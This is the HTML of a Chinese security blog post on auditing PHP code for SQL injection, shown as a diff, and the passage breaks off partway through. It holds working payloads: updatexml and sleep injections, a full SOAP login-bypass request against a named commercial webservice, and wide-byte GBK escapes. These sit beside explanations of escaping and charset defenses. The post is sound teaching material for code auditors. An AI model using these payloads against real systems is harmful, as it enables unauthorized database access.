@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言之前内部的一个分享，对SQL注入漏洞的一些总结。下面有些例子都在我本地的环境中，但是有对应的乌云编号，谷歌可以搜到。 什么是SQL注入漏洞程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP代码审计之SQL注入漏洞">
+<meta property="og:url" content="https://badgsd.github.io/2017/06/16/PHP代码审计之SQL注入漏洞/index.html">
+<meta property="og:site_name" content="Badcode">
+<meta property="og:description" content="前言之前内部的一个分享，对SQL注入漏洞的一些总结。下面有些例子都在我本地的环境中，但是有对应的乌云编号，谷歌可以搜到。 什么是SQL注入漏洞程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。 开发者在编写操作数据库代码时，直接将外部可控的参数拼接到S">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://badgsd.github.io/2017/06/16/PHP代码审计之SQL注入漏洞/1.png">
+<meta property="og:updated_time" content="2018-08-31T16:47:43.569Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP代码审计之SQL注入漏洞">
+<meta name="twitter:description" content="前言之前内部的一个分享，对SQL注入漏洞的一些总结。下面有些例子都在我本地的环境中，但是有对应的乌云编号，谷歌可以搜到。 什么是SQL注入漏洞程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。 开发者在编写操作数据库代码时，直接将外部可控的参数拼接到S">
+<meta name="twitter:image" content="https://badgsd.github.io/2017/06/16/PHP代码审计之SQL注入漏洞/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://badgsd.github.io/2017/06/16/PHP代码审计之SQL注入漏洞/"/>
+
+
+
+
+
+  <title>PHP代码审计之SQL注入漏洞 | Badcode</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Badcode</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2017/06/16/PHP代码审计之SQL注入漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Badcode">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Badcode">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP代码审计之SQL注入漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-16T00:29:55+08:00">
+                2017-06-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前内部的一个分享，对SQL注入漏洞的一些总结。下面有些例子都在我本地的环境中，但是有对应的乌云编号，谷歌可以搜到。</p>
+<h3 id="什么是SQL注入漏洞"><a href="#什么是SQL注入漏洞" class="headerlink" title="什么是SQL注入漏洞"></a>什么是SQL注入漏洞</h3><p>程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。</p>
+<p>开发者在编写操作数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过过滤或者过滤不全就直接放入到数据库中执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$sql = &quot;select password from user where id =&apos;$id&apos;&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="没有任何过滤的注入"><a href="#没有任何过滤的注入" class="headerlink" title="没有任何过滤的注入"></a>没有任何过滤的注入</h3><ul>
+<li><p>select </p>
+</li>
+<li><p>insert</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">admin</span>(<span class="string">`name`</span>, <span class="string">`pass`</span>)<span class="keyword">values</span>(<span class="string">'Olivia'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">version</span>())),<span class="number">0</span>) <span class="keyword">or</span><span class="string">''</span>, <span class="string">'123455'</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>update</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">admin</span> <span class="keyword">set</span> pass=<span class="string">'123'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">version</span>())),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">''</span><span class="keyword">WHERE</span> uid=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>delete</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> uid=<span class="number">2</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">version</span>())),<span class="number">0</span>) <span class="keyword">or</span><span class="string">''</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> uid=<span class="number">9</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<p>  <a href="http://cb.drops.wiki/drops/tips-2078.html" target="_blank" rel="noopener">利用insert，update和delete注入获取数据</a></p>
+</li>
+</ul>
+<h3 id="一些防护措施"><a href="#一些防护措施" class="headerlink" title="一些防护措施"></a>一些防护措施</h3><ul>
+<li><p>魔术引号  //GPC防护 –&gt; 5.4之后取消了</p>
+<ul>
+<li>当打开时，所有的 <code>&#39;</code>（单引号），<code>&quot;</code>（双引号），<code>\</code>（反斜线）和 <code>NULL</code> 字符都会被自动加上一个反斜线进行转义。这和 addslashes()作用完全相同。</li>
+<li>一共有三个魔术引号指令<ul>
+<li>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 </li>
+<li>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。</li>
+<li>magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ‘’。而双引号、反斜线 和 NULL 字符将不会进行转义。</li>
+</ul>
+</li>
+<li>为什么不用魔术引号 <ul>
+<li>可移植性 编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。</li>
+<li>性能 由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</li>
+<li>不便 由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 \’。针对这个问题，可以使用 stripslashes() 函数处理。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>PHP自带的过滤函数</p>
+<ul>
+<li><code>addslashes</code>    <ul>
+<li>为了语句能够安全用于数据库查询需要在某些字符前加上了反斜线。这些字符是单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）、反斜线（<code>\</code>）与 <code>NULL</code>（<strong>NULL</strong> 字符）。</li>
+</ul>
+</li>
+<li><code>mysql_[real]_escape_string</code><ul>
+<li><code>mysql_escape_string</code>和<code>mysql_real_escape_string</code>都是对字符串进行过滤的，这些字符串是<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code>，两个函数唯一不一样的地方在于<code>mysql_real_escape_string</code>接受的是一个连接句柄并根据当前字符集转义字符串。[PHP 5.5.0 起已废弃]</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>开发人员写的安全过滤函数，如phpcms 的 safe_replace</p>
+</li>
+<li><p>正则过滤，如匹配ip的正则</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\d+\.\d+\.\d+\.\d+\.</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="不受gpc影响的变量"><a href="#不受gpc影响的变量" class="headerlink" title="不受gpc影响的变量"></a>不受gpc影响的变量</h3><ul>
+<li><p><code>$_SERVER</code>变量: HTTP_X_FORWARDED_FOR,HTTP_HOST,HTTP_USER_AGENT,HTTP_REFERER,HTTP_CLIENT_IP，大多数web应用会记录访问者的ip及referer等信息。</p>
+<ul>
+<li>最常见的就是X-FOREARDED-FOR，在提取客户端的IP中使用，但是没有进行过滤验证，直接进入数据库中。<ul>
+<li><a href="http://localhost/wooyun/bug_detail.php?wybug_id=wooyun-2014-069541" target="_blank" rel="noopener">http://localhost/wooyun/bug_detail.php?wybug_id=wooyun-2014-069541</a></li>
+<li><a href="http://localhost/1000php/bugs/wooyun-2014-068853.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-068853.html</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>getenv()得到的变量（使用类似<code>$_SERVER</code>变量）[区别:<code>$getenv</code>取得系统的环境变量，环境变量的格式为name=value。<code>$_SERVER</code>是服务器超级全局变量数组]</p>
+<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+<li><p><code>$HTTP_RAW_POST_DATA</code>与PHP输入、输出流(主要应用与soap/xmlrpc/webpublish功能里)</p>
+<ul>
+<li>泛微 webservice</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UserLogin</span><span class="params">( $UserName, $Password )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$loginStatus = <span class="keyword">array</span>( );</span><br><span class="line">	<span class="keyword">if</span> ( trim( $UserName ) == <span class="string">""</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		$loginStatus[<span class="string">'status'</span>] = <span class="string">"false"</span>;</span><br><span class="line">		$loginStatus[<span class="string">'infor'</span>] = <span class="string">"用户名为空"</span>;</span><br><span class="line">		<span class="keyword">return</span> $loginStatus;</span><br><span class="line">	&#125;</span><br><span class="line">	$user = <span class="keyword">new</span> user( );</span><br><span class="line">	<span class="keyword">if</span> ( $user-&gt;CheckUserAccount( $UserName ) == <span class="keyword">false</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		$loginStatus[<span class="string">'status'</span>] = <span class="string">"false"</span>;</span><br><span class="line">		$loginStatus[<span class="string">'infor'</span>] = <span class="string">"用户名不存在"</span>;</span><br><span class="line">		<span class="keyword">return</span> $loginStatus;</span><br><span class="line">	&#125;</span><br><span class="line">	$userID = $user-&gt;getUserIDByUserAccount( $UserName );</span><br><span class="line">	<span class="keyword">if</span> ( $user-&gt;checkOldPassword( $userID, $Password ) == <span class="keyword">false</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		$loginStatus[<span class="string">'status'</span>] = <span class="string">"false"</span>;</span><br><span class="line">		$loginStatus[<span class="string">'infor'</span>] = <span class="string">"密码错误"</span>;</span><br><span class="line">		<span class="keyword">return</span> $loginStatus;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">global</span> $connection;</span><br><span class="line">	$query = <span class="string">"SELECT * from USER where USER_ACCOUNTS='&#123;$UserName&#125;'"</span>;</span><br><span class="line">	$cursor = exequery( $connection, $query );</span><br><span class="line">	$ROW = mysql_fetch_array( $cursor );</span><br><span class="line">	$timenow = time( );</span><br><span class="line">	$CUR_TIME = date( <span class="string">"Y-m-d H:i:s"</span>, $timenow );</span><br><span class="line">	$query = <span class="string">"update USER set LAST_VISIT_TIME='&#123;$CUR_TIME&#125;' where USER_ID='"</span>.$ROW[<span class="string">'USER_ID'</span>].<span class="string">"'"</span>;</span><br><span class="line">	exequery( $connection, $query );</span><br><span class="line">	session_start( );</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_USER_ID'</span>] = $ROW[<span class="string">'USER_ID'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_PASSWORD'</span>] = $ROW[<span class="string">'PASSWORD'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_POST_PRIV'</span>] = $ROW[<span class="string">'POST_PRIV'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_USER_ACCOUNTS'</span>] = $ROW[<span class="string">'USER_ACCOUNTS'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_USER_NAME'</span>] = $ROW[<span class="string">'USER_NAME'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_USER_PRIV'</span>] = $ROW[<span class="string">'USER_PRIV'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'LOGIN_DEPT_ID'</span>] = $ROW[<span class="string">'DEPT_ID'</span>];</span><br><span class="line">	$loginStatus[<span class="string">'status'</span>] = <span class="string">"true"</span>;</span><br><span class="line">	$loginStatus[<span class="string">'infor'</span>] = $ROW[<span class="string">'USER_ID'</span>];</span><br><span class="line">	<span class="keyword">return</span> $loginStatus;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>( <span class="string">"nusoap/lib/nusoap.php"</span> );</span><br><span class="line"><span class="keyword">include_once</span>( <span class="string">"api/user.class.php"</span> );</span><br><span class="line"><span class="keyword">include_once</span>( <span class="string">"inc/conn.php"</span> );</span><br><span class="line">$server = <span class="keyword">new</span> soap_server( );</span><br><span class="line">$server-&gt;soap_defencoding = <span class="string">"UTF-8"</span>;</span><br><span class="line">$server-&gt;decode_utf8 = <span class="keyword">false</span>;</span><br><span class="line">$server-&gt;configureWSDL( <span class="string">"LoginServicewsdl"</span>, <span class="string">"urn:LoginServicewsdl"</span> );</span><br><span class="line">$server-&gt;wsdl-&gt;schemaTargetNamespace = <span class="string">"urn:LoginServicewsdl"</span>;</span><br><span class="line">$server-&gt;wsdl-&gt;addComplexType( <span class="string">"loginStatus"</span>, <span class="string">"complexType"</span>, <span class="string">"struct"</span>, <span class="string">"all"</span>, <span class="string">""</span>, <span class="keyword">array</span>( <span class="string">"status"</span> =&gt; <span class="keyword">array</span>( <span class="string">"name"</span> =&gt; <span class="string">"status"</span>, <span class="string">"type"</span> =&gt; <span class="string">"xsd:string"</span> ), <span class="string">"infor"</span> =&gt; <span class="keyword">array</span>( <span class="string">"name"</span> =&gt; <span class="string">"infor"</span>, <span class="string">"type"</span> =&gt; <span class="string">"xsd:string"</span> ) ) );</span><br><span class="line">$server-&gt;register( <span class="string">"UserLogin"</span>, <span class="keyword">array</span>( <span class="string">"UserName"</span> =&gt; <span class="string">"xsd:string"</span>, <span class="string">"Password"</span> =&gt; <span class="string">"xsd:string"</span> ), <span class="keyword">array</span>( <span class="string">"return"</span> =&gt; <span class="string">"tns:loginStatus"</span> ), <span class="string">"urn:LoginServicewsdl"</span>, <span class="string">"urn:LoginServicewsdl#UserLogin"</span>, <span class="string">"rpc"</span>, <span class="string">"encoded"</span>, <span class="string">"UserLogin"</span> );</span><br><span class="line">$server-&gt;service( $HTTP_RAW_POST_DATA );</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">POST /webservice/login/login.wsdl.php HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: text/xml</span><br><span class="line">SOAPAction: <span class="string">"urn:LoginServicewsdl#UserLogin"</span></span><br><span class="line">Content-Length: <span class="number">609</span></span><br><span class="line">Referer: http:<span class="comment">//10.9.1.23:8082/webservice/eoffice.wsdl.php?wsdl</span></span><br><span class="line">Host: <span class="number">10.9</span><span class="number">.1</span><span class="number">.23</span>:<span class="number">8082</span></span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; WOW64) AppleWebKit/<span class="number">537.21</span> (KHTML, like Gecko) Chrome/<span class="number">41.0</span><span class="number">.2228</span><span class="number">.0</span> Safari/<span class="number">537.21</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="urn:LoginServicewsdl" xmlns:types="urn:LoginServicewsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;</span></span><br><span class="line"><span class="comment">&lt;soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;</span></span><br><span class="line"><span class="comment">&lt;tns:UserLogin&gt;</span></span><br><span class="line"><span class="comment">&lt;UserName xsi:type="xsd:string"&gt;admin' or '1'='1&lt;/UserName&gt;</span></span><br><span class="line"><span class="comment">&lt;Password xsi:type="xsd:string"&gt;456&lt;/Password&gt;</span></span><br><span class="line"><span class="comment">&lt;/tns:UserLogin&gt;</span></span><br><span class="line"><span class="comment">&lt;/soap:Body&gt;</span></span><br><span class="line"><span class="comment">&lt;/soap:Envelope&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>数组第一维变量的key不受魔术引号的影响。</p>
+<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></span><br><span class="line">print_R($_GET); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">Array</span> ( [aaaa<span class="string">'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) )</span></span><br></pre></td></tr></table></figure>
+</code></pre></li>
+<li><p><code>$_FILES</code> </p>
+<ul>
+<li><p>把上传的文件的文件名直接insert到数据库中了。</p>
+<ul>
+<li><a href="https://wizardforcel.gitbooks.io/php-common-vulnerability/content/26.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/php-common-vulnerability/content/26.html</a></li>
+<li>文件名过滤，但是后缀没有过滤。</li>
+</ul>
+<p>​</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过全局过滤的几种情况"><a href="#绕过全局过滤的几种情况" class="headerlink" title="绕过全局过滤的几种情况"></a>绕过全局过滤的几种情况</h3><ul>
+<li><p>参数没有单双引号包裹起来，不受gpc影响。数字型注入，类型没有进行强制转换</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select password from user where id =$id 1 union select user()"</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>宽字节注入</p>
+<ul>
+<li><p>被转义了<code>&#39;</code>-&gt; <code>\&#39;</code></p>
+<pre><code>1. 想办法给`\`前面再加一个`\`（或单数个即可），变成`\\&apos;`，这样`\`被转义了，`&apos;`逃出了限制
+</code></pre><p>​    2. 想办法把<code>\</code>弄没有。</p>
+</li>
+<li><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。</p>
+<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></li>
+</ul>
+</li>
+<li><p>数据库字符集的宽字节注入</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES gbk</span><br><span class="line">当这行代码在代码层被写入时，三个字符集（客户端、连接层、结果集）都是GBK编码。</span><br><span class="line">character_set_client</span><br><span class="line">character_set_connection</span><br><span class="line">character_set_results</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%df&apos;===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運&apos;</span><br><span class="line"></span><br><span class="line">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>输入%df%27时首先经过上面提到的单引号转义变成了%df%5c%27（%5c是反斜杠\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”，而单引号逃逸了出来，从而造成了注入漏洞。</p>
+<ul>
+<li><a href="http://localhost/wooyun/bug_detail.php?wybug_id=wooyun-2015-0126661" target="_blank" rel="noopener">http://localhost/wooyun/bug_detail.php?wybug_id=wooyun-2015-0126661</a></li>
+<li><a href="http://localhost/wooyun/bug_detail.php?wybug_id=wooyun-2015-0153584" target="_blank" rel="noopener">http://localhost/wooyun/bug_detail.php?wybug_id=wooyun-2015-0153584</a></li>
+</ul>
+</li>
+<li><p>防护</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET character_set_connection=gbk, character_set_results=gbk,</span><br><span class="line">character_set_client=binary</span><br><span class="line"></span><br><span class="line">mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</span><br><span class="line">然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了</span><br></pre></td></tr></table></figure>
+<p>  ​</p>
+</li>
+</ul>
+</li>
+<li><p>转换字符集造成的宽字节注入</p>
+<ul>
+<li>iconv</li>
+</ul>
